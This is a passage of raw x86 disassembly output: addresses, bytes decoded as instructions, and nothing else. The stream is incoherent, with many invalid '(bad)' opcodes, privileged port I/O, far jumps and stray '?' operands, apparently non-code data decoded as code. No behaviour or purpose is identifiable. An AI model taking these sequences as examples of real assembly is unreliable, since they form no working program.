  4043c5:	or     cl,BYTE PTR [edx]
  4043c7:	push   es
  4043c8:	dec    edx
  4043c9:	shr    BYTE PTR [edi-0x27],cl
  4043cc:	xor    al,0x89
  4043ce:	shl    BYTE PTR [esi+0x44],0x31
  4043d2:	ret    
  4043d3:	(bad)  
  4043d5:	jg     0x404360
  4043d7:	pop    ss
  4043d8:	mov    edx,0x2f859a9c
  4043dd:	pop    ds
  4043de:	xor    eax,0x672485be
  4043e3:	mov    es,WORD PTR [ebx+0x45bc6729]
  4043e9:	addr16 dec ecx
  4043eb:	xor    al,0x16
  4043ed:	xor    DWORD PTR [edi],esi
  4043ef:	add    DWORD PTR [edx+0x6a],ebx
  4043f2:	fwait
  4043f3:	lods   al,BYTE PTR ds:[esi]
  4043f4:	inc    esp
  4043f5:	je     0x40442d
  4043f7:	stos   DWORD PTR es:[edi],eax
  4043f8:	ret    
  4043f9:	in     al,0x65
  4043fb:	xchg   edi,eax
  4043fc:	jno    0x4043fa
  4043fe:	cmp    ah,BYTE PTR [edi+eiz*1]
  404401:	sbb    eax,0x8d314d81
  404406:	(bad)  
  404408:	retf   
  404409:	fadd   DWORD PTR [ecx+0x6556fe81]
  40440f:	popa   
  404410:	push   ebp
  404411:	call   0xf027:0x2fd71925
  404418:	dec    BYTE PTR [esi-0x33]
  40441b:	scas   al,BYTE PTR es:[edi]
  40441c:	add    ebp,DWORD PTR [edi-0x23]
  40441f:	ss pop ebx
  404421:	sbb    al,0xbd
  404423:	or     BYTE PTR [ebp-0x5d2717da],ah
  404429:	mov    dl,0x6b
  40442b:	adc    eax,DWORD PTR [ebx+ecx*8]
  40442e:	leave  
  40442f:	mov    dl,BYTE PTR [eax]
  404431:	fwait
  404432:	enter  0xee33,0x3a
  404436:	pop    ecx
  404437:	adc    DWORD PTR [ebp+eax*2+0x3c698512],ebp
  40443e:	imul   DWORD PTR [edx-0x7d]
  404441:	loop   0x40443f
  404443:	in     eax,dx
  404444:	mov    bh,BYTE PTR [ebx]
  404446:	out    0xd1,eax
  404448:	cmp    eax,0x9bf047cb
  40444d:	mov    dh,0x44
  40444f:	mov    eax,0x585d75e5
  404454:	push   0xc7397c08
  404459:	in     eax,0x51
  40445b:	rcl    BYTE PTR [edi+0x4f6e17c8],0x8b
  404462:	(bad)  
  404463:	hlt    
  404464:	or     al,0x40
  404466:	mov    ebp,0xf2054f1
  40446b:	arpl   WORD PTR [ebx],bp
  40446d:	mov    ah,0xdd
  40446f:	es adc ecx,0x7
  404473:	push   esp
  404474:	adc    esp,DWORD PTR [ebx-0x2c]
  404477:	pusha  
  404478:	fimul  WORD PTR [ecx-0x52]
  40447b:	fidiv  WORD PTR [eax+0x6b]
  40447e:	cmp    BYTE PTR [esi-0xe99e770],0x1c
  404485:	xchg   eax,edx
  404487:	popa   
  404488:	inc    edi
  404489:	(bad)  
  40448a:	cmp    BYTE PTR [esi],dl
  40448c:	adc    ebx,DWORD PTR [esp+ecx*2]
  40448f:	pop    ds
  404490:	or     dl,ah
  404492:	add    BYTE PTR [ecx-0x6370893b],0x40
  404499:	sub    DWORD PTR [edx+0x47],esp
  40449c:	adc    DWORD PTR [bx],esp
  40449f:	outs   dx,BYTE PTR ds:[esi]
  4044a0:	out    0x8d,al
  4044a2:	sbb    BYTE PTR [eax-0x7b],0x1b
  4044a6:	ins    DWORD PTR es:[edi],dx
  4044a7:	inc    esp
  4044a8:	pop    ds
  4044a9:	mov    eax,?
  4044ab:	aam    0xf6
  4044ad:	bound  ecx,QWORD PTR [edi+eiz*4+0x67]
  4044b1:	and    eax,0xf32c7207
  4044b6:	mov    esp,0x6febf08b
  4044bb:	call   0x43a7d122
  4044c0:	adc    al,0x7d
  4044c2:	sub    esi,DWORD PTR [ebp+0x6f]
  4044c5:	cwde   
  4044c6:	(bad)  
  4044c7:	push   0xbcaa3b46
  4044cc:	std    
  4044cd:	jg     0x40449f
  4044cf:	dec    edi
  4044d0:	jmp    0x7020:0x20c3541b
  4044d7:	add    al,0xf
  4044d9:	ins    BYTE PTR es:[edi],dx
  4044da:	jno    0x4044e8
  4044dc:	mov    ds,WORD PTR [ebx+0x4a4205e1]
  4044e2:	mov    esi,ebx
  4044e4:	shl    DWORD PTR [eax+0x44],cl
  4044e7:	add    al,0x85
  4044e9:	mov    DWORD PTR [edi+ebp*1+0x4c],ebp
  4044ed:	adc    dh,bl
  4044ef:	cld    
  4044f0:	out    0x32,al
  4044f2:	out    dx,al
  4044f3:	xchg   esi,eax
  4044f4:	sti    
  4044f5:	fnstenv [eax+esi*8]
  4044f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044f9:	jle    0x404558
  4044fb:	push   ebp
  4044fc:	push   ebp
  4044fd:	ss jmp 0x461601d3
  404503:	jns    0x404562
  404505:	mov    cl,0x82
  404507:	sbb    al,0x50
  404509:	inc    ebp
  40450a:	mov    al,0x7
  40450c:	les    esp,FWORD PTR [edx]
  40450e:	(bad)  
  40450f:	pushf  
  404510:	call   ebx
  404512:	add    DWORD PTR [esi-0x26],esp
  404515:	xor    BYTE PTR [esi+edi*2+0x2a],ah
  404519:	push   edi
  40451a:	sahf   
  40451b:	in     eax,0x4f
  40451d:	fs dec esi
  40451f:	mov    ah,0xe
  404521:	push   ebp
  404522:	ins    BYTE PTR es:[edi],dx
  404523:	mov    eax,DWORD PTR [edi]
  404525:	(bad)  
  404526:	mov    ch,BYTE PTR [eax+0x1d575b0a]
  40452c:	adc    eax,0xd5b4ca13
  404531:	inc    edi
  404532:	in     al,0x9
  404534:	mov    edi,0x16bc6876
  404539:	out    0x4e,eax
  40453b:	dec    ebx
  40453c:	pushf  
  40453d:	lea    edi,[ecx+eax*8+0x2e]
  404541:	mov    ds:0x8ab82a2f,eax
  404546:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404547:	test   al,0xaa
  404549:	xchg   edi,eax
  40454a:	or     al,BYTE PTR [esi+0x6a]
  40454d:	xchg   al,dl
  40454f:	xchg   ebp,eax
  404550:	data16 sub BYTE PTR [edx-0x60],al
  404554:	test   DWORD PTR [ebx+0x29ca070],edx
  40455a:	cli    
  40455b:	push   cs
  40455c:	xor    al,0x33
  40455e:	xchg   ebp,eax
  40455f:	adc    esi,ebx
  404561:	pusha  
  404562:	nop
  404563:	mov    al,ds:0x1fb3f67f
  404568:	fst    QWORD PTR [esp+eax*8+0x1b]
  40456c:	les    edx,FWORD PTR [esi]
  40456e:	fcom   DWORD PTR [eax+0x21]
  404571:	mov    BYTE PTR [eax],ah
  404573:	cwde   
  404574:	add    ebp,DWORD PTR fs:[ebp+0x2cee6411]
  40457b:	mov    eax,0x6edce447
  404580:	je     0x4045f0
  404582:	scas   eax,DWORD PTR es:[edi]
  404583:	push   0x6d2cc556
  404588:	and    al,0xb1
  40458a:	nop
  40458b:	mov    BYTE PTR [edi-0x11e1efd6],dh
  404591:	mov    al,0x9b
  404593:	cdq    
  404594:	adc    DWORD PTR ds:[ebx+0x0],eax
  404598:	pusha  
  404599:	or     eax,0x28b050fe
  40459e:	nop
  40459f:	cli    
  4045a0:	xchg   ebx,eax
  4045a1:	fwait
  4045a2:	inc    esp
  4045a3:	fsubrp st(3),st
  4045a5:	pop    edx
  4045a6:	mov    dh,0x37
  4045a8:	mov    al,0x8
  4045aa:	inc    ebx
  4045ab:	cdq    
  4045ac:	sub    eax,0x819a0e26
  4045b1:	lods   eax,DWORD PTR ds:[esi]
  4045b2:	mov    dl,0x95
  4045b4:	jmp    0x4045aa
  4045b6:	call   ebp
  4045b8:	in     eax,dx
  4045b9:	sub    al,BYTE PTR [esi+0xe]
  4045bc:	inc    esp
  4045bd:	fcos   
  4045bf:	js     0x404610
  4045c1:	xchg   ch,ch
  4045c3:	stc    
  4045c4:	jmp    0x40457d
  4045c6:	sub    DWORD PTR [edi-0x3e],esp
  4045c9:	mov    dh,0xca
  4045cb:	adc    eax,esi
  4045cd:	repnz out dx,eax
  4045cf:	cmp    DWORD PTR [ebx-0x3d49893f],ecx
  4045d5:	adc    BYTE PTR [esi-0x26e5c142],cl
  4045db:	mov    WORD PTR [edi-0xe],gs
  4045de:	call   0xea2:0x474b942f
  4045e5:	xrelease mov DWORD PTR [esi+edx*8+0x4bd4a90a],0x79ee7415
  4045f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f2:	test   DWORD PTR [eax+eiz*2],eax
  4045f5:	fimul  DWORD PTR [ecx-0x7c]
  4045f8:	mov    ds:0xfadf5c4f,al
  4045fd:	shl    ah,1
  4045ff:	mov    dh,0x8
  404601:	and    al,0xae
  404603:	xlat   BYTE PTR ds:[ebx]
  404604:	mov    bh,0x6d
  404606:	add    DWORD PTR [edx+0x39],esi
  404609:	pop    ss
  40460a:	in     eax,dx
  40460b:	push   esp
  40460c:	mov    eax,ds:0xec51d2df
  404611:	inc    edi
  404612:	sub    eax,0x33d95e46
  404617:	mov    cl,0x1a
  404619:	lods   al,BYTE PTR ds:[esi]
  40461a:	add    dh,cl
  40461c:	or     eax,0xbe0149af
  404621:	and    BYTE PTR [esi+ebx*4+0x0],dl
  404625:	cmp    al,ah
  404627:	add    eax,0x972a1475
  40462c:	or     DWORD PTR [esi+0x6c],esi
  40462f:	imul   ebx,DWORD PTR [ecx],0xad05699f
  404635:	test   DWORD PTR [eax-0x2e],ecx
  404638:	push   esi
  404639:	push   cs
  40463a:	sub    al,0x3
  40463c:	outs   dx,BYTE PTR ds:[esi]
  40463d:	adc    DWORD PTR [edi],esi
  40463f:	adc    al,0xfa
  404641:	shr    BYTE PTR ds:0xc5907cbd,0x14
  404648:	xor    DWORD PTR [edx-0x24976ef0],edi
  40464e:	mov    al,0xd6
  404650:	mov    ds:0x5a67319e,eax
  404655:	or     dh,al
  404657:	jb     0x404615
  404659:	shl    BYTE PTR [ebx],1
  40465b:	or     DWORD PTR [edx],ecx
  40465d:	jmp    0x8bcc:0xd6c0d6a5
  404664:	mov    edi,0xb22e7593
  404669:	cmc    
  40466a:	dec    edi
  40466b:	adc    esp,DWORD PTR [ecx-0x1400ee9]
  404671:	(bad)  
  404672:	pusha  
  404673:	cwde   
  404674:	outs   dx,BYTE PTR ds:[esi]
  404675:	jg     0x404696
  404677:	pop    ds
  404678:	ja     0x40465f
  40467a:	movsx  ebx,BYTE PTR ds:[ecx+0x48]
  40467f:	pushf  
  404680:	jo     0x4046e6
  404682:	int    0xed
  404684:	aad    0x4e
  404686:	jnp    0x4046cb
  404688:	pop    edx
  404689:	test   DWORD PTR [ecx-0x1f144030],eax
  40468f:	scas   al,BYTE PTR es:[edi]
  404690:	mov    dl,0xc2
  404692:	mov    bh,0x32
  404694:	retf   0x1de
  404697:	daa    
  404698:	shl    dh,1
  40469a:	inc    edi
  40469b:	aas    
  40469c:	mov    eax,0xbf1c10b3
  4046a1:	ins    BYTE PTR es:[edi],dx
  4046a2:	jecxz  0x404652
  4046a4:	aas    
  4046a5:	or     esp,DWORD PTR [ebx+esi*4+0x63]
  4046a9:	jnp    0x4046f3
  4046ab:	sub    esi,DWORD PTR [ecx-0x49]
  4046ae:	jns    0x4046d9
  4046b0:	sahf   
  4046b1:	sub    BYTE PTR [eax],0x47
  4046b4:	fs (bad) 
  4046b6:	call   0xb46885af
  4046bb:	dec    BYTE PTR [edx+esi*4+0x7bdc7f48]
  4046c2:	jo     0x40469c
  4046c4:	nop
  4046c5:	call   0x7c1aa891
  4046ca:	sbb    eax,esp
  4046cc:	imul   esi,DWORD PTR [ecx+0x42],0x8540e03b
  4046d3:	and    al,0xdb
  4046d5:	aas    
  4046d6:	push   esp
  4046d7:	inc    edi
  4046d8:	pop    edi
  4046d9:	pop    ds
  4046da:	fisttp WORD PTR cs:[esp+ebx*2+0x47]
  4046df:	stos   DWORD PTR es:[edi],eax
  4046e0:	sub    BYTE PTR [edi+0x74db015e],0x5
  4046e7:	rol    BYTE PTR [edi-0x5d0b13e3],cl
  4046ed:	ja     0x4046cd
  4046ef:	lods   al,BYTE PTR ds:[esi]
  4046f0:	jnp    0x4046f0
  4046f2:	adc    edi,DWORD PTR [eax]
  4046f4:	aas    
  4046f5:	mov    dl,0x66
  4046f7:	jo     0x40472b
  4046f9:	in     al,0x1
  4046fb:	adc    eax,0xdb08abda
  404700:	fs push edx
  404702:	clc    
  404703:	push   0xffffffb9
  404705:	fidivr WORD PTR [esi-0x80]
  404708:	push   cs
  404709:	(bad)  
  40470b:	leave  
  40470c:	xchg   ecx,eax
  40470d:	mov    ebp,0xfca225
  404712:	out    0xf4,eax
  404714:	sar    BYTE PTR [edi-0x49019d19],cl
  40471a:	and    al,0x26
  40471c:	xchg   edi,eax
  40471d:	or     bl,al
  40471f:	mov    eax,0x495b0846
  404724:	and    DWORD PTR ds:0x77e0c166,edi
  40472a:	push   ecx
  40472b:	adc    al,BYTE PTR [ecx-0x58a2cc92]
  404731:	push   cs
  404732:	xchg   esp,eax
  404733:	enter  0x6831,0x45
  404737:	adc    al,0x68
  404739:	push   ebp
  40473a:	cmp    eax,ebx
  40473c:	lahf   
  40473d:	scas   al,BYTE PTR es:[edi]
  40473e:	sub    edx,ecx
  404740:	repz into 
  404742:	dec    eax
  404743:	xchg   esp,eax
  404744:	mov    BYTE PTR [ebx+0x1d],0x4c
  404748:	(bad)  
  404749:	int3   
  40474a:	jp     0x404714
  40474c:	cmp    al,0x6a
  40474e:	outs   dx,BYTE PTR ds:[esi]
  40474f:	push   ds
  404750:	retf   
  404751:	dec    edx
  404752:	aas    
  404753:	push   0xffffffd3
  404755:	jmp    0x404714
  404757:	mov    WORD PTR [eax],?
  404759:	cdq    
  40475a:	jnp    0x404759
  40475c:	mov    eax,ds:0x31a78b5d
  404761:	and    eax,0x212e3adf
  404766:	pop    ebp
  404767:	jg     0x404759
  404769:	ja     0x4047d3
  40476b:	popf   
  40476c:	and    eax,0xa0ea49bb
  404771:	repnz (bad) 
  404773:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404774:	and    DWORD PTR [edx+0x17792132],0xb
  40477b:	sbb    eax,0x5f9740e8
  404780:	popa   
  404781:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404782:	std    
  404783:	popf   
  404784:	jo     0x4047e5
  404786:	fcmovb st,st(2)
  404788:	mov    WORD PTR [ecx+0x2e2890d5],gs
  40478e:	mov    edi,0xebb7d95b
  404793:	(bad)  
  404795:	shl    ebp,cl
  404797:	call   0x26aa:0xede21b2d
  40479e:	icebp  
  40479f:	fld    DWORD PTR [ecx+ebx*8+0x5b]
  4047a3:	out    0xae,eax
  4047a5:	xor    eax,0xa2d0837a
  4047aa:	push   edi
  4047ab:	enter  0x80e1,0xb
  4047af:	xchg   esp,eax
  4047b0:	pushf  
  4047b1:	or     al,0x84
  4047b3:	rol    DWORD PTR [ebp-0x7c0a5e0],1
  4047b9:	fcomp  DWORD PTR [edi-0xf4cfa9d]
  4047bf:	and    eax,DWORD PTR [ebx+0x4c]
  4047c2:	push   ecx
  4047c3:	shl    BYTE PTR [esi-0x20ae766c],0xa8
  4047ca:	lock leave 
  4047cc:	(bad)  [edx-0x39e83b17]
  4047d2:	xor    ch,BYTE PTR [esi+0x11]
  4047d5:	rcr    DWORD PTR [eax-0xfd3fe61],0xe9
  4047dc:	lds    ebx,FWORD PTR [edi]
  4047de:	test   al,0x88
  4047e0:	es mov cl,0xa
  4047e3:	pop    edx
  4047e4:	xor    eax,0x692280f1
  4047e9:	fld    TBYTE PTR [esi]
  4047eb:	cld    
  4047ec:	adc    al,0x8
  4047ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4047ef:	sub    al,0xdd
  4047f1:	stos   DWORD PTR es:[edi],eax
  4047f2:	jae    0x404789
  4047f4:	shr    cl,0xbc
  4047f7:	xor    ecx,edi
  4047f9:	popf   
  4047fa:	fimul  DWORD PTR [eax]
  4047fc:	cmp    BYTE PTR [esp+ebp*2+0x48],0x8
  404801:	scas   al,BYTE PTR es:[edi]
  404802:	pop    edi
  404803:	imul   edx,esp,0x7996f985
  404809:	retf   
  40480a:	xchg   DWORD PTR [edx],esi
  40480c:	adc    edi,DWORD PTR [ebp-0x26b9eea8]
  404812:	mov    eax,ds:0xfb43bc23
  404817:	(bad)  [ebx+edi*8]
  40481a:	cmc    
  40481b:	dec    edx
  40481c:	cdq    
  40481d:	repz inc ebx
  40481f:	mov    esp,0x4946f3f4
  404824:	xchg   DWORD PTR [esi],esi
  404826:	xchg   edi,eax
  404827:	cdq    
  404828:	xchg   BYTE PTR [ecx],bh
  40482a:	stc    
  40482b:	and    BYTE PTR [edi+eiz*2+0x1f],bh
  40482f:	pop    ecx
  404830:	sahf   
  404831:	push   eax
  404832:	aam    0xb
  404834:	xor    eax,0xabf59bc1
  404839:	shr    ebp,1
  40483b:	mov    al,0x2b
  40483d:	jmp    0xfc4b:0x71226ef5
  404844:	in     eax,dx
  404845:	adc    DWORD PTR ds:0x9645f642,0xffffff96
  40484c:	xchg   ecx,eax
  40484d:	cmp    DWORD PTR [ebx],edi
  40484f:	jb     0x40481b
  404851:	xchg   ch,bh
  404853:	push   cs
  404854:	mov    cl,0xbf
  404856:	jle    0x4444036b
  40485c:	dec    ebx
  40485d:	gs jg  0x4048d4
  404860:	mov    ds:0x457c83c6,eax
  404865:	xlat   BYTE PTR ds:[ebx]
  404866:	mov    al,0xb7
  404869:	iret   
  40486a:	dec    ebp
  40486b:	outs   dx,BYTE PTR ds:[esi]
  40486c:	aad    0x9d
  40486e:	out    0x6d,al
  404870:	xor    ch,ch
  404872:	dec    edi
  404873:	loop   0x4048bc
  404875:	pop    esi
  404876:	cmp    bh,dl
  404878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404879:	mov    WORD PTR [esi],cs
  40487b:	loopne 0x4048ee
  40487d:	xor    al,0x9
  40487f:	dec    edi
  404880:	scas   al,BYTE PTR es:[edi]
  404881:	xchg   edx,eax
  404882:	fld    st(3)
  404884:	stc    
  404885:	xchg   DWORD PTR [edx],esi
  404887:	leave  
  404888:	jl     0x4048e5
  40488a:	sbb    BYTE PTR [edx+0x3707b62],bl
  404890:	(bad)  
  404891:	jo     0x40489c
  404893:	loop   0x4048dc
  404895:	inc    ecx
  404896:	sar    BYTE PTR [ebp+0x18738e9],0x67
  40489d:	(bad)  
  40489e:	mov    bl,0x8d
  4048a0:	lds    edi,FWORD PTR [edx]
  4048a2:	shl    DWORD PTR [ebp+0x72d29835],cl
  4048a8:	pop    ss
  4048a9:	int    0xf7
  4048ab:	out    0x5a,al
  4048ad:	in     al,0xe6
  4048af:	mov    esp,0x255b3776
  4048b4:	and    eax,0x2d85b636
  4048b9:	out    dx,al
  4048ba:	push   edx
  4048bb:	inc    edx
  4048bc:	or     edx,edi
  4048be:	and    BYTE PTR [edx-0x48],bl
  4048c1:	fsubr  DWORD PTR [edx]
  4048c3:	mov    al,ds:0x34392225
  4048c8:	pusha  
  4048c9:	ror    DWORD PTR [ebx],cl
  4048cb:	fbstp  TBYTE PTR [edx+0x36]
  4048ce:	lock or eax,0x5a58bf1d
  4048d4:	pop    edi
  4048d5:	jle    0x404901
  4048d7:	push   edi
  4048d8:	leave  
  4048d9:	mov    al,ds:0x932c11f7
  4048de:	mov    ebx,0xd312f0ba
  4048e3:	mov    ebp,edx
  4048e5:	xchg   ecx,eax
  4048e6:	pop    esi
  4048e7:	mov    cl,0x52
  4048e9:	dec    ebp
  4048ea:	in     eax,0x56
  4048ec:	adc    eax,0x4a60390a
  4048f1:	mov    eax,0x6e4b2219
  4048f6:	and    eax,0xe0efe3df
  4048fb:	adc    esi,ebx
  4048fd:	pop    ebx
  4048fe:	cmp    eax,0x178da49d
  404903:	ds mov edi,0x97219fc6
  404909:	add    bh,al
  40490b:	cld    
  40490c:	xor    BYTE PTR [edx-0x5f94aed8],dh
  404912:	inc    edi
  404913:	dec    ecx
  404914:	sbb    edx,0x54
  404917:	out    0x9d,eax
  404919:	call   0xc67cd631
  40491e:	xchg   edi,eax
  40491f:	inc    ecx
  404920:	std    
  404921:	sbb    ebp,DWORD PTR [edx-0x40d3dd67]
  404927:	imul   DWORD PTR [edx+0x3c3d509d]
  40492d:	adc    eax,DWORD PTR [edx]
  40492f:	mov    bh,0x2f
  404931:	outs   dx,DWORD PTR ds:[esi]
  404932:	in     eax,dx
  404933:	rol    BYTE PTR [ecx+eax*1+0x5360d7b],cl
  40493a:	push   ss
  40493b:	adc    esp,DWORD PTR [ebx-0x46]
  40493e:	and    eax,DWORD PTR [eax+0x28]
  404941:	push   ecx
  404942:	inc    edx
  404943:	sti    
  404944:	stc    
  404945:	mov    ds:0x300b4341,al
  40494a:	test   al,0x8a
  40494c:	gs mov dh,0x7
  40494f:	xchg   ebp,eax
  404950:	push   esi
  404951:	push   edx
  404952:	jmp    0x5b7bcd1f
  404957:	inc    esp
  404958:	das    
  404959:	js     0x4048ed
  40495b:	lahf   
  40495c:	pop    es
  40495d:	sub    edi,DWORD PTR [ebx+0x25]
  404960:	cdq    
  404961:	je     0x404950
  404963:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404964:	or     al,0xad
  404966:	mov    dh,0xba
  404968:	shr    BYTE PTR gs:[edi-0xec05d8],1
  40496f:	les    ebp,FWORD PTR [ebx]
  404971:	adc    BYTE PTR [eax],al
  404973:	pop    ebx
  404974:	inc    edx
  404975:	icebp  
  404976:	out    dx,eax
  404977:	dec    eax
  404978:	les    edx,FWORD PTR [ecx]
  40497a:	pop    ds
  40497b:	dec    DWORD PTR [ebx+0x25e30fc3]
  404981:	adc    eax,0xe62b5e50
  404986:	ror    DWORD PTR [ecx-0x6c],0x3c
  40498a:	push   ecx
  40498b:	lahf   
  40498c:	cli    
  40498d:	xor    eax,0xf8ac4a3d
  404992:	cmp    edi,DWORD PTR [edx+0xf5ed209]
  404998:	imul   edi,DWORD PTR [edi-0x42a7014c],0x53
  40499f:	and    eax,0xd8132af6
  4049a4:	mov    bl,0x37
  4049a6:	sbb    DWORD PTR cs:[ecx],ebp
  4049a9:	mov    esp,0xdfa113a
  4049ae:	push   cs
  4049af:	enter  0x66cd,0xcf
  4049b3:	popf   
  4049b4:	and    ch,bl
  4049b6:	lods   eax,DWORD PTR ds:[esi]
  4049b7:	sub    edi,0xf90067db
  4049bd:	mov    ds:0x84efed36,al
  4049c2:	push   eax
  4049c3:	and    edx,DWORD PTR [eax-0x67]
  4049c6:	jne    0x4049ca
  4049c8:	pop    edi
  4049c9:	cdq    
  4049ca:	xchg   edx,eax
  4049cb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4049cc:	or     BYTE PTR [edi],bl
  4049ce:	sub    ebx,DWORD PTR [eax]
  4049d0:	sub    DWORD PTR [ebx+0x3a],edi
  4049d3:	pop    ebp
  4049d4:	push   ebx
  4049d5:	pop    ebx
  4049d6:	ja     0x404985
  4049d8:	and    eax,0xaf791d92
  4049dd:	xchg   ecx,eax
  4049de:	inc    esp
  4049df:	add    DWORD PTR [ebx],esp
  4049e1:	rcl    DWORD PTR [esi-0x244d15c],1
  4049e7:	nop
  4049e8:	das    
  4049e9:	std    
  4049ea:	jbe    0x404a48
  4049ec:	sar    edi,0xa0
  4049ef:	leave  
  4049f0:	sti    
  4049f1:	inc    ecx
  4049f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f3:	push   edi
  4049f4:	mov    edi,0x37412c62
  4049f9:	repz cmp DWORD PTR [edx],ebx
  4049fc:	les    eax,FWORD PTR [ebp+0x52]
  4049ff:	(bad)  
  404a00:	mul    edi
  404a02:	sub    edx,DWORD PTR [eax+0x44]
  404a05:	xor    dl,BYTE PTR [esi]
  404a07:	sbb    eax,0xcfc49b90
  404a0c:	sub    BYTE PTR [esi+0x7c4f864c],0x4f
  404a13:	cmp    eax,0x782ef9fd
  404a18:	ds ret 
  404a1a:	test   al,0x95
  404a1c:	and    al,BYTE PTR [edi]
  404a1e:	add    al,0xd4
  404a20:	ss pop es
  404a22:	adc    esi,DWORD PTR [edi-0x61]
  404a25:	rcr    BYTE PTR [eax+0x15],1
  404a28:	fcom   DWORD PTR [edi+0x695b8d9a]
  404a2e:	(bad)  
  404a2f:	ins    BYTE PTR es:[edi],dx
  404a30:	xlat   BYTE PTR ds:[ebx]
  404a31:	dec    edx
  404a32:	aaa    
  404a33:	lea    edx,[eax+0x39]
  404a36:	adc    al,0x73
  404a38:	sbb    BYTE PTR es:[esi+0x33],dh
  404a3c:	scas   eax,DWORD PTR es:[edi]
  404a3d:	ror    DWORD PTR [edx+0x260e0816],cl
  404a43:	test   BYTE PTR [ebp-0x7a],cl
  404a46:	(bad)  
  404a47:	iret   
  404a48:	popf   
  404a49:	mov    ds:0xd3bbcf8c,al
  404a4e:	adc    al,0x35
  404a50:	xchg   edx,eax
  404a51:	add    dl,BYTE PTR [edx+0x64b77a7f]
  404a57:	iret   
  404a58:	pop    eax
  404a59:	add    ch,BYTE PTR [edx+0x7a]
  404a5c:	mov    ecx,DWORD PTR [edi-0x3f]
  404a5f:	adc    BYTE PTR [esi-0x6c],ah
  404a62:	not    BYTE PTR [ebx]
  404a64:	add    eax,0x36e0be8c
  404a69:	retf   0x29ca
  404a6c:	xor    DWORD PTR [eax-0x39],0x45
  404a70:	outs   dx,BYTE PTR ds:[esi]
  404a71:	ret    
  404a72:	dec    edx
  404a73:	rol    BYTE PTR [ebp+0xe],1
  404a76:	inc    esp
  404a77:	loop   0x404ab6
  404a79:	test   DWORD PTR [edx-0x6f],ecx
  404a7c:	pop    esi
  404a7d:	mov    DWORD PTR [edi-0x8],esp
  404a80:	xchg   BYTE PTR [esi-0x7c],cl
  404a83:	cld    
  404a84:	ja     0x404af1
  404a86:	or     al,0x2b
  404a88:	jo     0x404a64
  404a8a:	sbb    BYTE PTR [edx+esi*1+0x2b168c92],0x64
  404a92:	arpl   WORD PTR [ecx-0xdcdfac],dx
  404a98:	into   
  404a99:	cli    
  404a9a:	mov    DWORD PTR [esi-0x2],edi
  404a9d:	jl     0x404a7d
  404a9f:	add    ebx,DWORD PTR [ecx]
  404aa1:	sub    DWORD PTR [edx-0x745a8655],0xffffffa1
  404aa8:	sti    
  404aa9:	add    esi,ebp
  404aab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404aac:	retf   0x91a4
  404aaf:	jbe    0x404a3e
  404ab1:	retf   
  404ab2:	add    BYTE PTR [esi+edi*1-0x3d],al
  404ab6:	and    DWORD PTR [edx],eax
  404ab8:	cmp    al,al
  404aba:	imul   ebx,DWORD PTR [esp],0xfffffff1
  404abe:	ret    
  404abf:	int3   
  404ac0:	mov    cl,0xab
  404ac2:	sbb    bl,BYTE PTR [ecx]
  404ac4:	lds    eax,FWORD PTR [ebx+0x788aee14]
  404aca:	lds    eax,FWORD PTR [ebx]
  404acc:	fmul   QWORD PTR [ebp+0x6b]
  404acf:	lahf   
  404ad0:	int    0x5c
  404ad2:	lds    esp,FWORD PTR [ebx+ebp*1-0x7f]
  404ad6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad7:	inc    eax
  404ad8:	test   ebp,ebp
  404ada:	xor    esi,DWORD PTR [esi-0x1a54f18d]
  404ae0:	rcr    BYTE PTR [ebp-0x3fd8a6ed],1
  404ae6:	das    
  404ae7:	and    eax,0x70537e6a
  404aec:	or     DWORD PTR [edx+edi*8],eax
  404aef:	push   ebp
  404af0:	stc    
  404af1:	inc    esi
  404af2:	out    dx,al
  404af3:	xor    al,0x38
  404af5:	retf   0x851a
  404af8:	retf   
  404af9:	cmp    dl,BYTE PTR [ebx]
  404afb:	xlat   BYTE PTR ds:[ebx]
  404afc:	rep outs dx,BYTE PTR ds:[esi]
  404afe:	outs   dx,BYTE PTR ds:[esi]
  404aff:	or     ecx,edx
  404b01:	pcmpgtb mm5,QWORD PTR [ebp-0x3a]
  404b05:	cmp    al,0xd6
  404b07:	sar    BYTE PTR [edi],0x73
  404b0a:	xor    DWORD PTR [eax-0x6a9f2a],ebx
  404b10:	pop    ecx
  404b11:	xor    eax,0x914ec7d0
  404b16:	pop    es
  404b17:	pop    ds
  404b18:	jne    0x404abf
  404b1a:	jo     0x404adf
  404b1c:	pop    esp
  404b1d:	(bad)  
  404b1e:	test   eax,0x34435fc7
  404b23:	mov    WORD PTR [ebp-0xb],cs
  404b26:	jae    0x404b34
  404b28:	sar    DWORD PTR [edi],cl
  404b2a:	mov    ecx,0x1964bdb1
  404b2f:	pop    ebx
  404b30:	jno    0x404b2e
  404b32:	loop   0x404b6a
  404b34:	imul   edi,DWORD PTR [edx-0x413b751c],0xc9c69485
  404b3e:	iret   
  404b3f:	aad    0x16
  404b41:	xchg   edx,eax
  404b42:	pop    es
  404b43:	imul   ebx,DWORD PTR [ebx-0x5b],0x1eac9506
  404b4a:	sub    dh,dl
  404b4c:	inc    eax
  404b4d:	das    
  404b4e:	adc    al,BYTE PTR ds:0x5fa05045
  404b54:	push   esp
  404b55:	adc    esi,0x1bbde949
  404b5b:	es ret 0x440b
  404b5f:	outs   dx,DWORD PTR ds:[esi]
  404b60:	pop    ss
  404b61:	jbe    0x404b7a
  404b63:	lds    esi,FWORD PTR [ebx]
  404b65:	dec    edi
  404b66:	dec    edx
  404b67:	or     esp,DWORD PTR [ebx+ebx*2-0x1d029285]
  404b6e:	dec    edi
  404b6f:	mov    ebx,?
  404b71:	shl    bl,cl
  404b73:	jmp    0xbfe6:0xcf87b415
  404b7a:	jle    0x404b8e
  404b7c:	push   es
  404b7d:	cdq    
  404b7e:	in     al,dx
  404b7f:	(bad)  
  404b80:	ds test eax,0xce796ed1
  404b86:	push   edi
  404b87:	cmp    eax,0x9e31646b
  404b8c:	sbb    al,0xfb
